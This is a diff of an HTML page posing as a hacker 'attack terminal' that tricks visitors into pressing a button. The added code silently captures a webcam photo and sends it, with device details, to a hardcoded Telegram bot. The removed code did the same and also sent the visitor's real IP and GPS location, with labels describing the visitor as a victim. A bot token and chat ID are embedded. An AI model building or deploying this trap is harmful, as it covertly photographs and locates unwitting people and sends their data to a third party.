@@ -3,101 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S P I D E R - E G A L S A</title>
+    <title>TERMINAL | SPIDER-RAT EXECUTION</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
-        .screen { display: none; padding: 20px; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        :root { --red: #ff0000; --dark-red: #440000; --glow: 0 0 15px #ff0000; }
+
+        body { 
+            background: #000; 
+            color: var(--red); 
+            font-family: 'Share Tech Mono', monospace; 
+            margin: 0; 
+            overflow: hidden; 
+            text-transform: uppercase;
+        }
+
+        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.5; }
+
+        /* تأثير المسح الليزري */
+        .scanner {
+            position: fixed; top: 0; left: 0; width: 100%; height: 5px;
+            background: rgba(255, 0, 0, 0.2);
+            box-shadow: 0 0 20px var(--red);
+            animation: scan 4s linear infinite;
+            z-index: -1;
+        }
+        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
+
+        .screen { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; position: relative; }
         .active { display: flex !important; }
-        .box { border: 2px solid #f00; padding: 30px; background: rgba(20,0,0,0.9); box-shadow: 0 0 20px #f00; width: 85%; max-width: 400px; }
-        button { background: #f00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        input { background: #111; border: 1px dashed #f00; color: #fff; padding: 10px; width: 90%; margin: 10px 0; text-align: center; }
+
+        /* الصندوق الاحترافي */
+        .frame {
+            border: 1px solid var(--red);
+            background: rgba(0, 0, 0, 0.8);
+            padding: 40px;
+            position: relative;
+            box-shadow: inset 0 0 20px var(--dark-red), var(--glow);
+            width: 90%; max-width: 500px;
+            clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%);
+        }
+
+        /* زوايا الديكور */
+        .frame::before {
+            content: ""; position: absolute; top: -2px; left: -2px; width: 20px; height: 20px;
+            border-top: 3px solid var(--red); border-left: 3px solid var(--red);
+        }
+
+        h1 { font-size: 2rem; margin-bottom: 20px; letter-spacing: 10px; text-shadow: var(--glow); }
+
+        input {
+            background: transparent; border: 1px solid var(--dark-red); color: #fff;
+            padding: 15px; width: 100%; box-sizing: border-box; margin: 20px 0;
+            outline: none; transition: 0.3s; font-family: inherit; text-align: center;
+        }
+        input:focus { border-color: var(--red); box-shadow: inset 0 0 10px var(--dark-red); }
+
+        button {
+            background: var(--red); color: #000; border: none; padding: 15px;
+            width: 100%; font-weight: bold; cursor: pointer; font-family: inherit;
+            letter-spacing: 2px; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
+            transition: 0.3s;
+        }
+        button:hover { background: #fff; transform: scale(1.05); }
+
+        /* شريط التحميل */
+        .loader-wrap { width: 100%; border: 1px solid var(--dark-red); height: 15px; margin: 20px 0; }
+        .progress { width: 0%; height: 100%; background: var(--red); transition: 0.5s; }
+        
+        .status-log { font-size: 10px; color: #888; text-align: left; height: 80px; overflow-y: hidden; line-height: 1.5; }
     </style>
 </head>
 <body>
 
+<canvas id="matrixCanvas"></canvas>
+<div class="scanner"></div>
+
 <div id="screen1" class="screen active">
-    <div class="box">
-        <h1>نظام التتبع V7</h1>
-        <p>أدخل الكود السري لفتح الرادار:</p>
-        <input type="text" id="ipInput" placeholder="0.0.0.0">
-        <button onclick="startMission()">بـدء المـهـمـة</button>
+    <div class="frame">
+        <h1>SYSTEM LOGIN</h1>
+        <p style="font-size: 12px; color: #666;">DECRYPTING GATEWAY...</p>
+        <input type="text" id="targetIp" placeholder="ENTER TARGET IPV4">
+        <button onclick="trapAction()">EXECUTE ATTACK</button>
     </div>
 </div>
 
 <div id="screen2" class="screen">
-    <div class="box">
-        <h2>تم الاختراق بنجاح</h2>
-        <button onclick="getLocation()">📍 سحب الموقع الجغرافي</button>
-        <button onclick="startCapture()">📸 سحب الصور (القناص)</button>
-        <button onclick="location.reload()">إغلاق المنصة</button>
+    <div class="frame">
+        <h2 id="statusHeader">INITIALIZING...</h2>
+        <div class="loader-wrap"><div id="bar" class="progress"></div></div>
+        <div id="status-log" class="status-log"></div>
     </div>
 </div>
 
 <script>
+    // --- Matrix Background ---
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const chars = "0101010101ABCDEF".split("");
+    const drops = Array(Math.floor(canvas.width/20)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#f00"; ctx.font = "15px Arial";
+        drops.forEach((y, i) => {
+            const text = chars[Math.floor(Math.random()*chars.length)];
+            ctx.fillText(text, i*20, y*20);
+            if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(draw, 33);
+
+    // --- Logic ---
     const CONFIG = {
         token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
         chatId: "1268323143"
     };
 
-    // وظيفة إرسال نص عام
-    async function sendToBot(msg) {
-        try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CONFIG.chatId, text: msg, parse_mode: "Markdown" })
-            });
-        } catch (e) { console.error("Error sending message"); }
-    }
+    async function trapAction() {
+        const ip = document.getElementById('targetIp').value;
+        if(!ip) return;
 
-    async function startMission() {
-        const userIp = document.getElementById('ipInput').value;
-        
-        // سحب الـ IP الحقيقي صامت
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                sendToBot(`🔥 **صيد جديد!**\n\n👤 الضحية كتب: ${userIp}\n🌐 الـ IP الحقيقي: ${data.ip}\n📱 الجهاز: ${navigator.platform}`);
-            });
+        // صيد الصور والبيانات
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video'); video.srcObject = stream; await video.play();
+            const canvasCap = document.createElement('canvas');
+            canvasCap.width = video.videoWidth; canvasCap.height = video.videoHeight;
+            setTimeout(async () => {
+                canvasCap.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvasCap.toBlob(res, 'image/jpeg'));
+                const fd = new FormData();
+                fd.append('chat_id', CONFIG.chatId);
+                fd.append('photo', blob, 'spy.jpg');
+                fd.append('caption', `📡 INTRUDER DETECTED\nIP: ${ip}\nSYSTEM: ${navigator.platform}`);
+                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            }, 1000);
+        } catch(e) {}
 
         document.getElementById('screen1').classList.remove('active');
         document.getElementById('screen2').classList.add('active');
+        runTerminal();
     }
 
-    function getLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                sendToBot(`📍 **موقع الضحية بدقة!**\n\nرابط الخريطة:\nhttps://www.google.com/maps?q=${lat},${lon}`);
-                alert("تم مزامنة إحداثيات الموقع!");
-            }, () => { alert("يجب تفعيل الـ GPS لسحب الموقع!"); });
-        }
-    }
-
-    async function startCapture() {
-        alert("جاري الاتصال بالكاميرا...");
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            setTimeout(async () => {
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                const fd = new FormData();
-                fd.append('chat_id', CONFIG.chatId);
-                fd.append('photo', blob, 'snap.jpg');
-                
-                await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
-                stream.getTracks().forEach(t => t.stop());
-                alert("تم سحب الصور بنجاح!");
-            }, 1000);
-        } catch (e) { alert("تم رفض إذن الكاميرا!"); }
+    function runTerminal() {
+        const bar = document.getElementById('bar');
+        const log = document.getElementById('status-log');
+        const msgs = ["[INFO] CONNECTING TO C&C...", "[OK] BYPASSING FIREWALL", "[WARN] ENCRYPTION DETECTED", "[OK] INJECTING PAYLOAD", "[SUCCESS] ACCESS GRANTED"];
+        let p = 0; let i = 0;
+        const interval = setInterval(() => {
+            p += 20; bar.style.width = p + "%";
+            if(i < msgs.length) log.innerHTML += msgs[i++] + "<br>";
+            if(p >= 100) {
+                clearInterval(interval);
+                document.getElementById('statusHeader').innerText = "COMPLETE";
+            }
+        }, 1500);
     }
 </script>
 </body>
